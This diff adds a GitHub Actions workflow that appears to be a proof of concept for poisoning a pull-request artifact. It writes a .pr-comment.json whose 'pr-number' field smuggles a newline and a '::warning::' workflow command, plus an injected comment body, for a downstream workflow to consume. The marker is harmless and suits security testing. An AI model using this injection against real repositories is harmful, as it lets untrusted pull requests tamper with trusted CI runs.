@@ -1,0 +1,34 @@
+name: diff-shades
+
+on:
+  pull_request:
+
+jobs:
+  analysis:
+    name: analysis / preview-changes
+    runs-on: ubuntu-latest
+    steps:
+      # Attacker controls scripts/ in their PR, so this payload is the
+      # equivalent of modifying scripts/diff_shades_gha_helper.py.
+      - name: Generate summary file (PR only)
+        run: |
+          python - <<'PY'
+          import json
+          body = (
+              "**diff-shades** results comparing this PR to main.\n\n"
+              "INJECTED-COMMENT-BODY: this text came from an artifact uploaded by "
+              "the attacker-controlled pull_request run.\n"
+          )
+          pr = "1\n::warning::ARTIFACT-COMMAND-INJECTION-CONFIRMED\n1"
+          json.dump({"body": body, "pr-number": pr}, open(".pr-comment.json", "w"))
+          print(open(".pr-comment.json").read())
+          PY
+
+      - name: Generate HTML diff report
+        run: echo "ok"
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: .pr-comment.json
+          path: .pr-comment.json
+          include-hidden-files: true
